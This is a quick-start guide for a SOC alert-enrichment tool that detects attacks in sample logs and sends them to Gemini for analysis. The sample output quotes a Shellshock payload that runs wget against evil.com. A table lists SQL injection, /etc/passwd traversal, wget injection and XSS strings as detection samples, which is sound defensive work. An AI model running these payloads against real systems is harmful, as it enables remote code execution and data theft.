# Quick Start Guide for Judges

**⏱️ Get Ghost Shell Guardian running in 2 minutes.**

---

## Step 1: Install (1 minute)

```powershell
# Activate virtual environment
.\venv\Scripts\Activate.ps1

# Install dependencies (if needed)
pip install -r requirements.txt
```

---

## Step 2: Configure API (30 seconds)

Create a `.env` file in the project root:

```env
GEMINI_API_KEY=your_gemini_3_api_key_here
```

**Need an API key?** Get one from [Google AI Studio](https://aistudio.google.com) or [Google Cloud Console](https://console.cloud.google.com).

⚠️ **Important**: Your API key must have access to **Gemini 3 models** (not Gemini 2 or older).

---

## Step 3: Run Demo (30 seconds)

### Option A: See Help & Available Attacks
```powershell
python src/main.py --help
```

### Option B: Process All 5 Attacks
```powershell
python src/main.py
```

This will:
1. Load 5 sample attack logs
2. Parse each one
3. Detect attack type (Shellshock, SQLi, XSS, etc.)
4. Send to Gemini 3 for AI enrichment
5. Save results to `outputs/`

### Option C: Test One Attack
```powershell
python src/main.py shellshock.log
python src/main.py sql_injection.log
python src/main.py xss_reflected.log
```

---

## What You'll See

```
============================================================
Ghost Shell Guardian - SOC Alert Enrichment
============================================================

============================================================
Processing: shellshock.log
============================================================
[*] Loading log from: ...shellshock.log
[*] Parsing log...
Parsed Alert: {
  "source_ip": "41.90.12.77",
  "payload": "() { :;}; /bin/bash -c \"wget http://evil.com/bot\"",
  "user_agent": "ShellShock-Exploit/1.0"
}

[*] Detecting attack pattern...
Attack Type: Shellshock

[*] Enriching alert with Gemini API...

Enriched Alert:
----------------------------------------
{
  "intent": "Remote Code Execution via Shellshock",
  "mitre_technique": "T1190",
  "severity": "Critical",
  "reasoning": "The payload contains () { :;}; which exploits CVE-2014-6271...",
  "recommended_action": "Immediately block source IP..."
}

[SUCCESS] Enriched alert saved to: .../outputs/shellshock_enriched.json
```

---

## Sample Attacks Included

| Sample | Attack Type | What It Shows |
|--------|------------|---|
| `shellshock.log` | **Bash RCE** | CVE-2014-6271 exploitation |
| `sql_injection.log` | **SQL Injection** | `' OR '1'='1` classic attack |
| `path_traversal.log` | **Directory Traversal** | `../../../../etc/passwd` |
| `rce_wget.log` | **Remote Command Exec** | `wget` command injection |
| `xss_reflected.log` | **XSS Attack** | `<script>alert('XSS')</script>` |

---

## Check Results

After running, look at enriched outputs:

```powershell
# List all enriched results
ls outputs/

# View a result
cat outputs/shellshock_enriched.json
```

---

## Troubleshooting

| Problem | Solution |
|---------|----------|
| `GEMINI_API_KEY not found` | Create `.env` with your API key |
| `No Gemini 3 models available` | API key doesn't have Gemini 3 access. Check your Google Cloud project. |
| `ModuleNotFoundError: google` | Run `pip install -r requirements.txt` in activated venv |
| `Connection timeout` | Check internet. Gemini API requires connectivity. |

---

## Advanced: Test Individual Components

```powershell
# Test parser (extract data from logs)
python src/parser.py

# Test rules engine (detect attacks)
python src/rules.py

# Test all samples (parse + detect, NO Gemini)
python src/test_samples.py

# Test Gemini directly (requires API key)
python src/gemini_engine.py
```

---

## What's Happening Behind the Scenes

```
Raw Log File
     ↓
[Parser] Extracts: IP, Payload, User-Agent
     ↓
[Rules Engine] Detects: Shellshock? SQLi? XSS?
     ↓
[Gemini 3 API] Analyzes with AI
     ↓
[Output] JSON with Intent, MITRE, Severity, Recommendations
     ↓
outputs/*.json
```

Each step is independent and testable.

---

## Key Features

✅ **5 Diverse Attack Samples** — Tests different threat types
✅ **Real AI Enrichment** — Uses Gemini 3 (not fake data)
✅ **Strict API Requirements** — No fallbacks, production-ready
✅ **Clear Error Messages** — Know exactly what went wrong
✅ **Clean JSON Output** — Integrates with Splunk, ELK, etc.
✅ **Interview-Proof** — Simple code, easy to explain

---

## That's It! 🚀

You now have a working AI-powered SOC alert enrichment system using Google's Gemini 3 API.

For more details, read:
- **README.md** — Full feature overview
- **ARCHITECTURE.md** — Deep technical explanation
- **src/main.py / src/parser.py / src/rules.py** — Commented source code

**Questions?** Every error message tells you what's wrong and how to fix it.
